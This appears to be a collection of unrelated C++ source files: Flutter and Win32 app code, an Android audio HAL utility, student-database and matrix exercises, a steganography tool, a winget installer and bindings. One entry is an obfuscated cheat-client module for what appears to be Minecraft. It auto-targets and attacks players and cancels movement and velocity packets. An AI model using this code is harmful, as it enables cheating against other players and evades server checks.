    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_phrasesgenerator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"core/default/ParametersUtil.h\"\n#include \"core/default/Util.h\"\n\n#include <system/audio.h>\n#include <tinyalsa/asoundlib.h>\n\n#include <util/CoreUtils.h>\n\nnamespace android {\nnamespace hardware {\nnamespace audio {\nnamespace CORE_TYPES_CPP_VERSION {\nnamespace implementation {\n\nconstexpr int SLOT_POSITIONS_0[] = { 0, 1, 0, 1 };\nconstexpr int SLOT_POSITIONS_90[] = { 1, 1, 0, 0 };\nconstexpr int SLOT_POSITIONS_180[] = { 1, 0, 1, 0 };\nconstexpr int SLOT_POSITIONS_270[] = { 0, 0, 1, 1 };\n\nvoid setMixerValueByName(mixer *mixer, const char *name, int value) {\n    const auto ctl = mixer_get_ctl_by_name(mixer, name);\n\n    if (ctl == nullptr) {\n        ALOGE(\"Failed to find mixer ctl for %s\", name);\n        return;\n    }\n\n    if (mixer_ctl_set_value(ctl, 0, value) < 0) {\n        ALOGE(\"Failed to set ctl value %d for %s\", value, name);\n        return;\n    }\n}\n\nvoid setSlotPositions(const int *values) {\n    const auto mixer = mixer_open(0);\n\n    if (mixer == nullptr) {\n        ALOGE(\"Failed to open mixer\");\n        return;\n    }\n\n    setMixerValueByName(mixer, \"FL ASPRX1 Slot Position\", values[0]);\n    setMixerValueByName(mixer, \"FR ASPRX1 Slot Position\", values[1]);\n    setMixerValueByName(mixer, \"RL ASPRX1 Slot Position\", values[2]);\n    setMixerValueByName(mixer, \"RR ASPRX1 Slot Position\", values[3]);\n\n    mixer_close(mixer);\n};\n\nvoid setAfeProxyMixers(bool enabled) {\n    const auto mixer = mixer_open(0);\n\n    if (mixer == nullptr) {\n        ALOGE(\"Failed to open mixer\");\n        return;\n    }\n\n    for (int i = 1; i <= 16; i++) {\n        const auto mixerName = \"AFE_PCM_RX Audio Mixer MultiMedia\" + std::to_string(i);\n        setMixerValueByName(mixer, mixerName.c_str(), enabled);\n    }\n\n    mixer_close(mixer);\n}\n\n/** Converts a status_t in Result according to the rules of AudioParameter::get*\n * Note: Static method and not private method to avoid leaking status_t dependency\n */\nstatic Result getHalStatusToResult(status_t status) {\n    switch (status) {\n        case OK:\n            return Result::OK;\n        case BAD_VALUE:  // Nothing was returned, probably because the HAL does\n                         // not handle it\n            return Result::NOT_SUPPORTED;\n        case INVALID_OPERATION:  // Conversion from string to the requested type\n                                 // failed\n            return Result::INVALID_ARGUMENTS;\n        default:  // Should not happen\n            ALOGW(\"Unexpected status returned by getParam: %u\", status);\n            return Result::INVALID_ARGUMENTS;\n    }\n}\n\nResult ParametersUtil::getParam(const char* name, bool* value) {\n    String8 halValue;\n    Result retval = getParam(name, &halValue);\n    *value = false;\n    if (retval == Result::OK) {\n        if (halValue.empty()) {\n            return Result::NOT_SUPPORTED;\n        }\n        *value = !(halValue == AudioParameter::valueOff);\n    }\n    return retval;\n}\n\nResult ParametersUtil::getParam(const char* name, int* value) {\n    const String8 halName(name);\n    AudioParameter keys;\n    keys.addKey(halName);\n    std::unique_ptr<AudioParameter> params = getParams(keys);\n    return getHalStatusToResult(params->getInt(halName, *value));\n}\n\nResult ParametersUtil::getParam(const char* name, String8* value, AudioParameter context) {\n    const String8 halName(name);\n    context.addKey(halName);\n    std::unique_ptr<AudioParameter> params = getParams(context);\n    return getHalStatusToResult(params->get(halName, *value));\n}\n\nvoid ParametersUtil::getParametersImpl(\n    const hidl_vec<ParameterValue>& context, const hidl_vec<hidl_string>& keys,\n    std::function<void(Result retval, const hidl_vec<ParameterValue>& parameters)> cb) {\n    AudioParameter halKeys;\n    for (auto& pair : context) {\n        halKeys.add(String8(pair.key.c_str()), String8(pair.value.c_str()));\n    }\n    for (size_t i = 0; i < keys.size(); ++i) {\n        halKeys.addKey(String8(keys[i].c_str()));\n    }\n    std::unique_ptr<AudioParameter> halValues = getParams(halKeys);\n    Result retval =\n        (keys.size() == 0 || halValues->size() != 0) ? Result::OK : Result::NOT_SUPPORTED;\n    hidl_vec<ParameterValue> result;\n    result.resize(halValues->size());\n    String8 halKey, halValue;\n    for (size_t i = 0; i < halValues->size(); ++i) {\n        status_t status = halValues->getAt(i, halKey, halValue);\n        if (status != OK) {\n            result.resize(0);\n            r",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nvoid addstudent() {\r\n    string id;\r\n    string name;\r\n    int age;\r\n    int credit_hours;\r\n    double cgpa;\r\n    ofstream fout(\"student_database.txt\", ios::app);\r\n    if (!fout) {\r\n        cout << \"Error opening File....\" << endl;\r\n        return;\r\n    }\r\n    cout << \"Enter Student ID: \";\r\n    cin >> id;\r\n    cout << \"Enter the Name: \";\r\n    cin.ignore();\r\n    getline(cin, name);\r\n    cout << \"Enter Your age: \";\r\n    cin >> age;\r\n    cout << \"Enter Your CGPA: \";\r\n    cin >> cgpa;\r\n    cout << \"Enter Credit Hours: \";\r\n    cin >> credit_hours;\r\n\r\n    fout << id << \"\\t\" << name << \"\\t\" << age << \"\\t\" << cgpa << \"\\t\" << credit_hours << endl;\r\n    fout.close();\r\n    cout << \"Student Record added Successfully!\" << endl;\r\n}\r\n\r\nvoid displayallstudents() {\r\n    string id;\r\n    string name;\r\n    double cgpa;\r\n    char heading[100];\r\n    int credit_hours, age;\r\n    ifstream fin(\"student_database.txt\");\r\n    if (!fin) {\r\n        cout << \"Error opening File!\" << endl;\r\n        return;\r\n    }\r\n    cout << \"ALL Student records: \" << endl;\r\n    cout << \"ID\\tName\\tAge\\tCGPA\\tCredit Hours\" << endl;\r\n    while (fin >> id >> name >> age >> cgpa >> credit_hours) {\r\n        cout << id << \"\\t\" << name << \"\\t\" << age << \"\\t\" << cgpa << \"\\t\" << credit_hours << endl;\r\n    }\r\n    fin.close();\r\n}\r\n\r\nvoid updatestudent() {\r\n    ifstream fin(\"student_database.txt\");\r\n    ofstream tempfile(\"temp.txt\");\r\n    if (!fin || !tempfile) {\r\n        cout << \"Error Opening file\" << endl;\r\n        return;\r\n    }\r\n    string id, name, targetID;\r\n    double cgpa;\r\n    int age, credit_hours;\r\n    bool found = false;\r\n    cout << \"Enter the Student ID To Update: \";\r\n    cin >> targetID;\r\n    while (fin >> id >> name >> age >> cgpa >> credit_hours) {\r\n        if (id == targetID) {\r\n            found = true;\r\n            cout << \"Enter new Name: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            cout << \"Enter New Age: \";\r\n            cin >> age;\r\n            cout << \"Enter New CGPA: \";\r\n            cin >> cgpa;\r\n            cout << \"Enter New Credit Hours: \";\r\n            cin >> credit_hours;\r\n        }\r\n        tempfile << id << \"\\t\" << name << \"\\t\" << age << \"\\t\" << cgpa << \"\\t\" << credit_hours << endl;\r\n    }\r\n    fin.close();\r\n    tempfile.close();\r\n    if (found) {\r\n        remove(\"student_database.txt\");\r\n        rename(\"temp.txt\", \"student_database.txt\");\r\n        cout << \"Student record updated Successfully.\" << endl;\r\n    }\r\n    else {\r\n        remove(\"temp.txt\");\r\n        cout << \"Student ID Not Found\" << endl;\r\n    }\r\n}\r\n\r\nvoid searchbycgpa() {\r\n    ifstream fin(\"student_database.txt\");\r\n    if (!fin) {\r\n        cout << \"Error opening file.\" << endl;\r\n        return;\r\n    }\r\n    string id, name;\r\n    int age, credit_hour;\r\n    double cgpa;\r\n    bool found = false;\r\n    double targetCGPA;\r\n    cout << \"Enter CGPA to search: \";\r\n    cin >> targetCGPA;\r\n    while (fin >> id >> name >> age >> cgpa >> credit_hour) {\r\n        if (cgpa == targetCGPA) {\r\n            cout << id << \"\\t\" << name << \"\\t\" << age << \"\\t\" << cgpa << \"\\t\" << credit_hour << endl;\r\n            found = true;\r\n        }\r\n    }\r\n    if (!found) {\r\n        cout << \"No student found with CGPA: \" << targetCGPA << endl;\r\n    }\r\n    fin.close();\r\n}\r\n\r\nvoid deletestudent() {\r\n    ifstream fin(\"student_database.txt\");\r\n    ofstream fout(\"temp.txt\");\r\n    string id, name, targetID;\r\n    int age, credit_hours;\r\n    double cgpa;\r\n    bool found = false;\r\n    cout << \"Enter the Student ID to Delete: \";\r\n    cin >> targetID;\r\n    while (fin >> id >> name >> age >> cgpa >> credit_hours) {\r\n        if (id != targetID) {\r\n            fout << id << \"\\t\" << name << \"\\t\" << age << \"\\t\" << cgpa << \"\\t\" << credit_hours << endl;\r\n        }\r\n        else {\r\n            found = true;\r\n        }\r\n    }\r\n    fin.close();\r\n    fout.close();\r\n    if (found) {\r\n        remove(\"student_database.txt\");\r\n        rename(\"temp.txt\", \"student_database.txt\");\r\n        cout << \"Student record deleted Successfully!\" << endl;\r\n    }\r\n    else {\r\n        remove(\"temp.txt\");\r\n        cout << \"Student ID not Found.\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"\\n\\t\\tStudent Database Management System\\t\\t\\n\\n\" << endl;\r\n        cout << \"1. Add Student Record.\" << endl;\r\n        cout << \"2. Display ALL Student Records.\" << endl;\r\n        cout << \"3. Search student by CGPA.\" << endl;\r\n        cout << \"4. Update Student Information.\" << endl;\r\n        cout << \"5. Delete Student Record.\" << endl;\r\n        cout << \"6. Exit.\" << endl;\r\n        cout << \"Enter your Choice: \";\r\n        cin >> choice;\r\n        switch (choice) {\r\n        case 1:\r\n            addstudent();\r\n            break;\r\n        case 2:\r\n            displayallstudents();\r\n            break;\r\n        case 3:\r\n            searchbycgpa();\r\n            break;\r\n        case 4:\r\n            updatestudent();\r\n            bre",
    "#include \"BGE_FileReader.hpp\"\n#include \"BGE_ContentConverter.hpp\"\n\n#include <filesystem>\n#include <iostream>\n#include <array>\n#include <chrono>\n\nint main() {\n\t//Testing code\n\n\tauto start = std::chrono::high_resolution_clock::now();\n\n\tconst char* path = \"C:\\\\example\";\n\tstd::string paths;\n\n\tpaths = BGE::BGE_FileReader::showContents(path);\n\n\tBGE::BGE_FileReader::modeFilteredContent(paths, 0);\n\n\tstd::vector<std::string> extension{ \".txt\" };\n\n\tBGE::BGE_FileReader::extensionFilteredContent(paths, extension);\n\n\tstd::vector<std::string> contents = BGE::BGE_FileReader::readContent(paths);\n\n\tstd::array<std::array<float, 12>, 2> ar{};\n\tar = BGE::BGE_ContentConverter<float, 2, 12>::BGE_convertAll(contents);\n\tstd::cout << ar.size() << std::endl;\n\tfor (const auto& rows : ar) {\n\t\tfor (const auto& element : rows) {\n\t\t\tstd::cout << element << ' ';\n\t\t}\n\t\tstd::cout << std::endl << std::endl;\n\t}\n\n\tauto end = std::chrono::high_resolution_clock::now();\n\n\tdouble time_taken = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();\n\n\ttime_taken *= 1e-9;\n\n\tstd::cout << \"Time taken by program is: \" << std::fixed << time_taken\n\t\t<< std::setprecision(9) << \" sec\" << std::endl;\n\n\treturn 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <bitset>\n#include <limits>\nusing namespace std;\n\nclass BitManip {\npublic:\n    string imageFile = \"images/inputs/\";\n    string outputFile = \"images/outputs/\";\n    string ext = \".bmp\";\n    void setLSB(char &byte, int bit) {\n        byte = (byte & 0xFE) | (bit & 1);\n    }\n\n    int getLSB(char byte) {\n        return byte & 1;\n    }\n};\n\nclass Steganography : public BitManip {\npublic:\n    void encodeMessage(const string &message){\n        string in;\n        string out;\n        cout << \"Enter input file name: \";\n        getline(cin, in);\n        cout << \"Enter output file name: \";\n        getline(cin, out);\n\n        ifstream image(imageFile + in + ext, ios::binary);\n        ofstream output(outputFile + out + ext, ios::binary);\n\n        if (!image.is_open() || !output.is_open()) {\n            cerr << \"Error opening file!\" << endl;\n            return;\n        }\n\n        char header[54];\n        image.read(header, 54);\n        output.write(header, 54);\n\n        string binaryMessage;\n        for (char c : message) {\n            binaryMessage += bitset<8>(c).to_string();\n        }\n        binaryMessage += \"00000000\";\n\n        char pixel;\n        size_t messageIndex = 0;\n\n        while (image.get(pixel)) {\n            if (messageIndex < binaryMessage.size()) {\n                setLSB(pixel, binaryMessage[messageIndex] - '0');\n                messageIndex++;\n            }\n            output.put(pixel);\n        }\n\n        image.close();\n        output.close();\n\n        cout << \"Message encoded in \" << outputFile + out + ext << endl;\n    }\n\n    string decodeMessage(){\n        string decode = \"images/outputs/\";\n        string dec;\n        cout << \"Enter file name to decode from: \";\n        getline(cin, dec);\n        \n        ifstream image(decode + dec + ext, ios::binary);\n\n        if (!image.is_open()) {\n            cerr << \"Error opening file!\" << endl;\n            return \"\";\n        }\n\n        image.seekg(54);\n\n        string binaryMessage;\n        char pixel;\n        string message;\n\n        while (image.get(pixel)) {\n            binaryMessage += to_string(getLSB(pixel));\n\n            if (binaryMessage.size() == 8) {\n                char decodedChar = bitset<8>(binaryMessage).to_ulong();\n                if (decodedChar == '\\0') {\n                    break;\n                }\n                message += decodedChar;\n                binaryMessage.clear();\n            }\n        }\n        image.close();\n        return message;\n    }\n};\n\nint main() {\n    string message;\n    int choice;\n\n    Steganography n1;\n\n    do {\n        cout << \"1. Encode\\n2. Decode\\n3. Exit\\n\";\n        cout << \"Enter choice: \";\n        if (!(cin >> choice)) {\n            cout << \"Invalid input! Please enter a number.\" << endl;\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            continue;\n        }    \n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        switch (choice) {\n            case 1:\n                cout << \"Enter message: \";\n                getline(cin, message);\n                n1.encodeMessage(message);\n                break;\n            case 2:\n                cout << \"The message in the image is: \" << n1.decodeMessage() << endl;\n                break;\n            case 3:\n                cout << \"Thank you!\\n\";\n                break;\n            default:\n                cout << \"Invalid choice\" << endl;\n        }\n    } while (choice != 3);\n    return 0;\n}",
    "#include <iostream>\n#include <ctime>\nusing namespace std;\n\nvoid Matrix(const int N, const int M)\n{\n    srand(time(0));\n    \n    int a = 0;\n    int b = 5;\n    int num, ser, maxSer(0), c(0);\n\n    int MTR[N][M];\n    bool isNull;\n\n    for (int i(0); i < N; i++)\n    {\n        isNull = false;\n\n        for (int j(0); j < M; j++)\n        {\n            MTR[i][j] = rand() % (b - a + 1) - a;\n            cout.width(3);\n            cout << MTR[i][j];\n\n            if (MTR[i][j] == 0)\n                isNull = true;\n        }\n\n        // null e\n        cout << endl;\n        if (isNull)\n            c++;\n    }\n    cout << endl\n         << endl;\n\n    for (int i(0); i < M; i++)\n    {\n        ser = 1;\n        for (int j(0); j < N; j++)\n        {\n            if (j && (MTR[j][i] == MTR[j - 1][i]))\n            {\n                ser++;\n                if (ser > maxSer)\n                {\n                    maxSer = ser;\n                    num = i;\n                }\n            }\n            else\n                ser = 1;\n        }\n    }\n    cout << endl\n         << endl;\n    cout << \"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u0440\u043e\u043a, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0438\u0445 \u043d\u043e\u043b\u044c: \" << c << endl;\n\n    cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0441\u0435\u0440\u0438\u044f \u043f\u043e\u0432\u0442\u043e\u0440\u044f\u044e\u0449\u0438\u0445\u0441\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u0441\u0442\u043e\u043b\u0431\u0446\u0435: \" << maxSer << endl;\n    cout << \"\u041d\u043e\u043c\u0435\u0440 \u0441\u0442\u043e\u043b\u0431\u0446\u0430, \u0441 \u043c\u0430\u043a\u0441 \u0441\u0435\u0440\u0438\u0435\u0439: \" << num << endl;\n}\n\nint main()\n{\n    // srand(time(0));\n\n    int i, j;\n    cin >> i;\n    cin >> j;\n\n    Matrix(i, j);\n    return 0;\n}\n// 18\n",
    "#include<iostream>#include<xxXXXxxXxX>#include<XXXxxXxXxXx>#include<XXXxxxXXXx>#include<xxXXXxxxX>#include<XxxxxXx>#include<xxxxxXxx>#include<xxxxxx>namespace a1{class b1;class c1;class d1;class e1;class f1;class g1;namespace h1{namespace i1{namespace j1{class k1;class l1;class m1;class n1;}}}}class o1{public:double a,b,c;o1(double a,double b,double c):a(a),b(b),c(c){}o1(const XxX::EntityPlayer&p1){auto q1=p1.getPosition();a=q1.a;b=q1.b;c=q1.c;}double r1(const o1&s1)const{return std::sqrt(std::pow(a-s1.a,2)+std::pow(b-s1.b,2)+std::pow(c-s1.c,2));}};class t1{public:double a,b;t1(double a,double b):a(a),b(b){}};class u1{public:virtual void v1()=0;virtual void w1()=0;virtual void x1()=0;virtual void y1(const std::shared_ptr<a1::b1>&z1)=0;virtual void A1(const std::shared_ptr<a1::b1>&B1)=0;virtual std::string C1()const=0;};class D1{public:virtual bool E1()const=0;virtual double F1()const=0;};class G1:public D1{private:std::vector<std::string>H1;int I1;public:G1(const std::vector<std::string>&H1,int I1):H1(H1),I1(I1){}bool E1()const override{return true;}double F1()const override{return I1;}};class J1:public D1{private:double K1;public:J1(double K1):K1(K1){}bool E1()const override{return true;}double F1()const override{return K1;}};class L1:public D1{private:bool M1;public:L1(bool M1):M1(M1){}bool E1()const override{return M1;}double F1()const override{return 0;}};class N1:public u1{private:static const std::vector<std::string>O1;G1 P1;J1 Q1;J1 R1;J1 S1;L1 T1;L1 U1;L1 V1;J1 W1;std::shared_ptr<XxX::EntityPlayer>X1=nullptr;o1*Y1=nullptr;o1*Z1=nullptr;o1*a2=nullptr;t1*b2=nullptr;t1*c2=nullptr;int d2=INT_MAX;std::queue<std::shared_ptr<a1::b1>>e2;XxX::EntityPlayerSP*f2;XxX::World*g2;public:N1(XxX::EntityPlayerSP*f2,XxX::World*g2):f2(f2),g2(g2),P1({\"SilentMove\",\"Instant\"},0),Q1(10,5,100,5),R1(6,3,6,1),S1(1,1,5,0.1),T1(true),U1(false),V1(false),W1(20,1,20,1){}void v1()override{if(Y1!=nullptr){f2->setPosition(Y1->a,Y1->b,Y1->c);}if(a2!=nullptr){f2->motionX=a2->a;f2->motionY=a2->b;f2->motionZ=a2->c;}X1=nullptr;Y1=nullptr;Z1=nullptr;a2=nullptr;b2=nullptr;c2=nullptr;d2=INT_MAX;h1();}void x1()override{if(T1.E1()&&Y1!=nullptr){}}void w1()override{if(X1==nullptr||!g2->playerEntities.contains(*X1)){X1=i1();if(X1!=nullptr)Utils::sendMessage(\"found target \"+X1->getName());return;}if(Y1==nullptr||a2==nullptr||b2==nullptr){Y1=new o1(*f2);Z1=new o1(*Y1);a2=new o1(f2->motionX,f2->motionY,f2->motionZ);b2=new t1(f2->rotationYaw,f2->rotationPitch);c2=new t1(*b2);}o1 d3(*X1);double e3=Y1->r1(d3);double f3=MoveUtil::getAllowedHorizontalDistance();if(S1.F1()!=1){f3=S1.F1();}if(e3<=(X1==f2?std::sqrt(f3*f3):R1.F1())){if(X1==f2){X1=nullptr;Y1=nullptr;a2=nullptr;b2=nullptr;h1();}else{b2=new t1(PlayerRotation::getYaw(d3),PlayerRotation::getPitch(d3));Utils::attackEntity(X1,true);Utils::sendMessage(\"attack\");X1=f2;}return;}switch(static_cast<int>(P1.F1())){case 0:{double g3=d3.a-Y1->a;double h3=d3.c-Y1->c;if(g3>f3){b2->a=-90;a2->a+=f3;}else if(g3<-f3){b2->a=90;a2->a-=f3;}else if(h3>f3){b2->a=0;a2->c+=f3;}else if(h3<-f3){b2->a=180;a2->c-=f3;}Y1->a+=a2->a;Y1->c+=a2->c;a2->a=0.5;a2->c=0.5;if(std::abs(a2->a)<0.005)a2->a=0;if(std::abs(a2->c)<0.005)a2->c=0;break;}case 1:{a2->a=a2->b=a2->c=0;Y1->a=d3.a;Y1->b=d3.b;Y1->c=d3.c;break;}}j1();}void y1(const std::shared_ptr<a1::b1>&Fvv)override{if(X1!=nullptr&&std::dynamic_pointer_cast<XxX::network::play::client::C03PacketPlayer>(Fvv)){Fvv->setCanceled(true);}}void A1(const std::shared_ptr<a1::b1>&Fvv)override{if(Y1!=nullptr&&Z1!=nullptr&&a2!=nullptr&&b2!=nullptr&&c2!=nullptr){if(std::dynamic_pointer_cast<XxX::S12PacketEntityVelocity>(Fvv)){Fvv->setCanceled(true);auto m2=std::dynamic_pointer_cast<XxX::S12PacketEntityVelocity>(Fvv);a2}}}};\r\n",
    "#include \"pch.h\"\n#include <windows.h>\n#include \"resource.h\"\n#include <string>\n#include <map>\n#include <vector>\n\n// Forward declarations of functions\nLRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);\nvoid AddMenus(HWND);\nvoid ShowAboutDialog(HWND);\nvoid InstallSoftware(const std::wstring& software);\nvoid HandleError(const std::wstring& message);\n\n// Global variables\nHMENU hMenu;\nstd::map<std::wstring, std::wstring> softwareMap = {\n    {L\"python\", L\"Python.Python.3\"},\n    {L\"visual studio code\", L\"Microsoft.VisualStudioCode\"},\n    {L\"git\", L\"Git.Git\"},\n    {L\"node.js\", L\"OpenJS.NodeJS\"},\n    {L\"docker\", L\"Docker.DockerDesktop\"},\n    {L\"java\", L\"Oracle.JavaRuntimeEnvironment\"},\n    {L\"notepad++\", L\"Notepad++.Notepad++\"}\n};\n\n// Entry point\nint WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {\n    // Register the window class\n    WNDCLASSW wc = {};\n    wc.lpfnWndProc = WndProc;\n    wc.hInstance = hInstance;\n    wc.lpszClassName = L\"WindowsAppTest\";\n    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\n    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);\n    RegisterClassW(&wc);\n\n    // Create the window\n    HWND hwnd = CreateWindowExW(\n        0,\n        L\"WindowsAppTest\",\n        L\"Windows App Test\",\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT, CW_USEDEFAULT, 500, 300,\n        NULL, NULL, hInstance, NULL\n    );\n\n    if (hwnd == NULL) {\n        HandleError(L\"Failed to create window\");\n        return 0;\n    }\n\n    ShowWindow(hwnd, nCmdShow);\n    UpdateWindow(hwnd);\n\n    // Run the message loop\n    MSG msg = {};\n    while (GetMessage(&msg, NULL, 0, 0)) {\n        TranslateMessage(&msg);\n        DispatchMessage(&msg);\n    }\n\n    return 0;\n}\n\n// Window procedure\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {\n    switch (msg) {\n    case WM_CREATE:\n        AddMenus(hwnd);\n        break;\n    case WM_COMMAND:\n        switch (LOWORD(wParam)) {\n        case IDM_ABOUT:\n            ShowAboutDialog(hwnd);\n            break;\n        case IDM_EXIT:\n            PostQuitMessage(0);\n            break;\n        case 40003: // Example for installing Python\n            InstallSoftware(L\"python\");\n            break;\n            // Add cases for other software\n        case 40004:\n            InstallSoftware(L\"visual studio code\");\n            break;\n        case 40005:\n            InstallSoftware(L\"git\");\n            break;\n        case 40006:\n            InstallSoftware(L\"node.js\");\n            break;\n        case 40007:\n            InstallSoftware(L\"docker\");\n            break;\n        case 40008:\n            InstallSoftware(L\"java\");\n            break;\n        case 40009:\n            InstallSoftware(L\"notepad++\");\n            break;\n        }\n        break;\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        break;\n    default:\n        return DefWindowProc(hwnd, msg, wParam, lParam);\n    }\n    return 0;\n}\n\n// Show About dialog\nvoid ShowAboutDialog(HWND hwnd) {\n    MessageBox(hwnd, L\"Windows App Test\\nVersion 1.0\\n\\nCopyright (c) 2024\", L\"About Windows App Test\", MB_OK | MB_ICONINFORMATION);\n}\n\n// Add menus\nvoid AddMenus(HWND hwnd) {\n    hMenu = CreateMenu();\n\n    HMENU hFileMenu = CreateMenu();\n    HMENU hHelpMenu = CreateMenu();\n    HMENU hInstallMenu = CreateMenu();\n\n    AppendMenu(hFileMenu, MF_STRING, IDM_EXIT, L\"Exit\");\n    AppendMenu(hHelpMenu, MF_STRING, IDM_ABOUT, L\"About\");\n\n    // Adding all software installation options\n    AppendMenu(hInstallMenu, MF_STRING, 40003, L\"Install Python\");\n    AppendMenu(hInstallMenu, MF_STRING, 40004, L\"Install Visual Studio Code\");\n    AppendMenu(hInstallMenu, MF_STRING, 40005, L\"Install Git\");\n    AppendMenu(hInstallMenu, MF_STRING, 40006, L\"Install Node.js\");\n    AppendMenu(hInstallMenu, MF_STRING, 40007, L\"Install Docker\");\n    AppendMenu(hInstallMenu, MF_STRING, 40008, L\"Install Java\");\n    AppendMenu(hInstallMenu, MF_STRING, 40009, L\"Install Notepad++\");\n\n    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, L\"File\");\n    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hHelpMenu, L\"Help\");\n    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hInstallMenu, L\"Install\");\n\n    SetMenu(hwnd, hMenu);\n}\n\n// Install Software\nvoid InstallSoftware(const std::wstring& software) {\n    auto it = softwareMap.find(software);\n    if (it != softwareMap.end()) {\n        std::wstring command = L\"winget install \" + it->second;\n        _wsystem(command.c_str());\n        MessageBox(NULL, (L\"Installing \" + software).c_str(), L\"Install Software\", MB_OK | MB_ICONINFORMATION);\n    }\n    else {\n        HandleError(L\"Software not found\");\n    }\n}\n\n// Handle error\nvoid HandleError(const std::wstring& message) {\n    MessageBox(NULL, message.c_str(), L\"Error\", MB_OK | MB_ICONERROR);\n}\n",
    "#include <pybind11/pybind11.h>\n#include <pybind11/stl.h> // Required for std::optional support\n#include \"screamer/common/base.h\"\n#include \"screamer/ffill.h\"\n#include \"screamer/fillna.h\"\n#include \"screamer/clip.h\"\n\nnamespace py = pybind11;\n\nvoid init_bindings_preprocessing(py::module& m) {\n\n    py::class_<screamer::Ffill, screamer::ScreamerBase>(m, \"Ffill\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Ffill::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Ffill::reset, \"Reset to the initial state.\");\n\n    py::class_<screamer::FillNa, screamer::ScreamerBase>(m, \"FillNa\")\n        .def(py::init<double>(), py::arg(\"fill\"))\n        .def(\"__call__\", &screamer::FillNa::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::FillNa::reset, \"Reset to the initial state.\");\n\n\n     py::class_<screamer::Clip>(m, \"Clip\")\n        .def(\n          py::init<\n               std::optional<double>,\n               std::optional<double>\n          >(),\n          py::arg(\"lower\") = std::nullopt,\n          py::arg(\"upper\") = std::nullopt\n        )\n        .def(\"__call__\", &screamer::Clip::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Clip::reset, \"Reset to the initial state.\");\n\n}\n",
    "#include \"flutter_error_handler_plugin.h\"\n\n// This must be included before many other Windows headers.\n#include <windows.h>\n\n// For getPlatformVersion; remove unless needed for your plugin implementation.\n#include <VersionHelpers.h>\n\n#include <flutter/method_channel.h>\n#include <flutter/plugin_registrar_windows.h>\n#include <flutter/standard_method_codec.h>\n\n#include <memory>\n#include <sstream>\n\nnamespace flutter_error_handler {\n\n// static\nvoid FlutterErrorHandlerPlugin::RegisterWithRegistrar(\n    flutter::PluginRegistrarWindows *registrar) {\n  auto channel =\n      std::make_unique<flutter::MethodChannel<flutter::EncodableValue>>(\n          registrar->messenger(), \"flutter_error_handler\",\n          &flutter::StandardMethodCodec::GetInstance());\n\n  auto plugin = std::make_unique<FlutterErrorHandlerPlugin>();\n\n  channel->SetMethodCallHandler(\n      [plugin_pointer = plugin.get()](const auto &call, auto result) {\n        plugin_pointer->HandleMethodCall(call, std::move(result));\n      });\n\n  registrar->AddPlugin(std::move(plugin));\n}\n\nFlutterErrorHandlerPlugin::FlutterErrorHandlerPlugin() {}\n\nFlutterErrorHandlerPlugin::~FlutterErrorHandlerPlugin() {}\n\nvoid FlutterErrorHandlerPlugin::HandleMethodCall(\n    const flutter::MethodCall<flutter::EncodableValue> &method_call,\n    std::unique_ptr<flutter::MethodResult<flutter::EncodableValue>> result) {\n  if (method_call.method_name().compare(\"getPlatformVersion\") == 